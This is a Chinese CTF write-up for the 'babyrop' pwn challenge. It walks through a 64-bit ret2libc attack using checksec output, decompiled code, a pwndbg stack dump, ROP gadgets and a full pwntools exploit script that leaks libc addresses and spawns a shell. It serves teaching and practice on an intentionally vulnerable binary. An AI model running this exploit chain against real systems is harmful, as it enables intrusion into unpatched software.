# babyrop

- 作者：pn1fg
- 参考：-
- 难度：Baby/Trivial/Easy/Normal/Medium/Hard/Expert/Insane
- 分类：Pwn
- 镜像：[svuctf-winter-2023/babyrop](https://ghcr.io/svuctf/svuctf-winter-2023/babyrop)
- 端口：70

## 题目描述

本题考点 `ret2libc`

## 题目解析

- 源码：[babyrop.c](build/babyrop)
- 考点：64位下的 ROP - ret2libc

`ret2libc` 即控制程序执行 libc 中的函数通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system("/bin/sh")，故而此时我们需要知道 system 函数的地址。

`动态链接` 是指在程序装载时通过 `动态链接器` 将程序所需的所有 `动态链接库(Dynamic linking library)` 装载至进程空间中（ 程序按照模块拆分成各个相对独立的部分），当程序运行时才将他们链接在一起形成一个完整程序的过程。

不是很能理解的同学看[这里](https://www.freebuf.com/news/182894.html)（这篇文章详细的阐述了 `StackOverFlow-Ret2libc` 的原理以及利用思路）

### 查看文件信息

查看文件类型（`file` 命令）：

```shell
$ file babyrop
babyrop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1adc48d4177aba667c4f389c674628d870b8a762, for GNU/Linux 3.2.0, not stripped
```

这是一个64位 ELF 文件（`ELF 64-bit LSB executable`），动态链接（`dynamically linked`），没有去除符号（`not stripped`）

检查文件保护机制（`checksec`命令）：

```shell
$ checksec babyrop 
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### 分析漏洞成因

反编译 `vuln` 函数：

```c
void sym.vuln(void)

{
    ulong ptr;
    ulong var_88h;
    ulong var_80h;
    ulong var_78h;
    uchar buf [112];

    ptr = 0x6b20756f79206f44;
    var_88h = 0x6666756220776f6e;
    var_80h = 0x667265766f207265;
    var_78h._0_4_ = 0x3f776f6c;
    var_78h._4_2_ = 10;
    sym.imp.write(1, &ptr, 0x1e);
    sym.imp.read(0, buf, 0x200);
    return;
}
```

`read` 函数处存在溢出漏洞

使用 gdb + pwndbg 调试，在 `0x401227` 处打断点，输入一串字符串，打印栈上的情况

```asm
pwndbg> stack 30
00:0000│ rsp 0x7fffffffe400 ◂— 'Do you know buffer overflow?\n'
01:0008│     0x7fffffffe408 ◂— 'now buffer overflow?\n'
02:0010│     0x7fffffffe410 ◂— 'er overflow?\n'
03:0018│     0x7fffffffe418 ◂— 0xa3f776f6c /* 'low?\n' */
04:0020│ rsi 0x7fffffffe420 ◂— 0x4141414141414141 ('AAAAAAAA')
05:0028│     0x7fffffffe428 —▸ 0x7ffff7e3630a (_IO_file_overflow+186) ◂— jg 0x7ffff7e3627d
06:0030│     0x7fffffffe430 ◂— 0x3c7
07:0038│     0x7fffffffe438 —▸ 0x402008 ◂— 0x2d2d2d2d2d2d2d2d ('--------')
08:0040│     0x7fffffffe440 —▸ 0x7ffff7f8b5c0 (_IO_2_1_stdout_) ◂— 0xfbad2887
09:0048│     0x7fffffffe448 —▸ 0x7ffff7e2bdea (puts+506) ◂— cmp eax, -1
0a:0050│     0x7fffffffe450 —▸ 0x7ffff7f8b4e0 (_IO_2_1_stderr_) ◂— 0xfbad2087
0b:0058│     0x7fffffffe458 —▸ 0x7ffff7e2c50d (setvbuf+285) ◂— cmp rax, 1
0c:0060│     0x7fffffffe460 —▸ 0x7fffffffe5b8 —▸ 0x7fffffffe91f 
0d:0068│     0x7fffffffe468 —▸ 0x7fffffffe490 —▸ 0x7fffffffe4a0 ◂— 0x1
0e:0070│     0x7fffffffe470 ◂— 0x0
0f:0078│     0x7fffffffe478 —▸ 0x7fffffffe5c8 —▸ 0x7fffffffe933 ◂— 'XDG_RUNTIME_DIR=/run/user/1000'
10:0080│     0x7fffffffe480 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2d0 ◂— 0x0
11:0088│     0x7fffffffe488 —▸ 0x40120f (banner+20) ◂— nop
12:0090│ rbp 0x7fffffffe490 —▸ 0x7fffffffe4a0 ◂— 0x1
13:0098│     0x7fffffffe498 —▸ 0x4012cd (main+38) ◂— mov eax, 0
14:00a0│     0x7fffffffe4a0 ◂— 0x1
15:00a8│     0x7fffffffe4a8 —▸ 0x7ffff7dd9cd0 (__libc_start_call_main+128) ◂— mov edi, eax
16:00b0│     0x7fffffffe4b0 —▸ 0x7fffffffe5a0 —▸ 0x7fffffffe5a8 —▸ 0x7ffff7f94000 —▸ 0x7ffff7db2000 ◂— ...
17:00b8│     0x7fffffffe4b8 —▸ 0x4012a7 (main) ◂— endbr64
18:00c0│     0x7fffffffe4c0 ◂— 0x100400040 /* '@' */
19:00c8│     0x7fffffffe4c8 —▸ 0x7fffffffe5b8 —▸ 0x7fffffffe91f
1a:00d0│     0x7fffffffe4d0 —▸ 0x7fffffffe5b8 —▸ 0x7fffffffe91f 
1b:00d8│     0x7fffffffe4d8 ◂— 0x720d8351e2e1f40c
1c:00e0│     0x7fffffffe4e0 ◂— 0x0
1d:00e8│     0x7fffffffe4e8 —▸ 0x7fffffffe5c8 —▸ 0x7fffffffe933 ◂— 'XDG_RUNTIME_DIR=/run/user/1000'
```

我们输入的 `buf` 距离 `rbp` 寄存器 `0x7fffffffe490 - 0x7fffffffe420 = 0x70` ，与反汇编时输出一致，当输入 `0x70` 个字符后，再输入8个字节，就可完全覆盖 `rbp` ，继续再输入8个字节即可覆盖返回地址

### 构造利用载荷

列出所有函数：

```c
[0x0040121f]> afl
0x004010b0    1     46 entry0
0x004010f0    4     31 sym.deregister_tm_clones
0x00401120    4     49 sym.register_tm_clones
0x00401160    3     32 sym.__do_global_dtors_aux
0x00401190    1      6 sym.frame_dummy
0x00401350    1      5 sym.__libc_csu_fini
0x0040121f    1    136 sym.vuln
0x00401080    1     11 sym.imp.write
0x00401090    1     11 sym.imp.read
0x00401358    1     13 sym._fini
0x00401212    1     10 sym.gadget
0x004011fb    1     23 sym.banner
0x00401070    1     11 sym.imp.puts
0x00401196    1    101 sym.init
0x004010a0    1     11 sym.imp.setvbuf
0x004012e0    4    101 sym.__libc_csu_init
0x004010e0    1      5 sym._dl_relocate_static_pie
0x004012a7    1     45 main
0x00401000    3     27 sym._init
```

没有发现 `system`、`execve` 等函数

查找一下敏感字符串

```shell
$ ROPgadget --binary babyrop --string "/bin/sh"
Strings information
============================================================
```

分析到这可以判断本题使用的攻击方式是 `ret2libc` ，并且本题的输出函数只有一个 `write` 函数，我们来看一下 `write` 函数的原型

```shell
ssize_t write(int fd, void *buf, size_t count);
```

- `fd`：文件描述符，`1` 为标准输出
- `buf`：读入位置
- `count`：写入的字节数

64 位 ELF 文件，所以需要寄存器传参，这里一共需要三个

获取 ROP：

```shell
$ ROPgadget --binary babyrop --only 'pop|ret'
Gadgets information
============================================================
0x000000000040133c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040133e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401340 : pop r14 ; pop r15 ; ret
0x0000000000401342 : pop r15 ; ret
0x000000000040133b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040133f : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040117d : pop rbp ; ret
0x0000000000401343 : pop rdi ; ret
0x000000000040121a : pop rdx ; ret
0x0000000000401341 : pop rsi ; pop r15 ; ret
0x000000000040133d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret
```

这里我们泄露 write 的地址，基本利用思路如下

- 泄露 write 地址
- 获取 libc 版本
- 获取 system 地址与 /bin/sh 的地址
- 再次执行源程序
- 触发栈溢出执行 system(‘/bin/sh’)

### 编写利用程序

[exp.py](writeup/exp.py)

```python
from pwn import *
from LibcSearcher import *

context.arch = 'amd64'
context.log_level = 'debug'

if args['REMOTE']:
    io = remote('IP',port)
else:
    io = process('./babyrop')

elf = ELF('./babyrop')
padding = 0x70 + 8
pop_rdi_ret = 0x0000000000401343
pop_rsi_r15_ret = 0x0000000000401341
pop_rdx_ret = 0x000000000040121a
ret_add = 0x000000000040101a

payload = flat(
        [
            cyclic(padding),
            pop_rdi_ret,
            1,
            pop_rsi_r15_ret,
            elf.got['write'],
            0,
            pop_rdx_ret,
            8,
            elf.plt['write'],
            elf.sym['vuln'],
        ]
)

io.sendlineafter(b'flow?\n',payload)
write_add = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
success(f'write_add ==> {hex(write_add)}')

if args['REMOTE']:
    libc = LibcSearcher('write',write_add)
    base_add = write_add - libc.dump('write')
    system_add = base_add + libc.dump('system')
    bin_sh_add = base_add + libc.dump('str_bin_sh')
else:
    libc = elf.libc
    base_add = write_add - libc.sym['write']
    system_add = base_add + libc.sym['system']
    bin_sh_add = base_add + next(libc.search(b'/bin/sh'))

payload = flat(
        [
            cyclic(padding),
            pop_rdi_ret,
            bin_sh_add,
            system_add,
        ]
)

io.sendlineafter(b'flow?\n',payload)
io.interactive()
```

第一次泄漏的 `payload` 稍微有点复杂，大家注意栈上参数布置
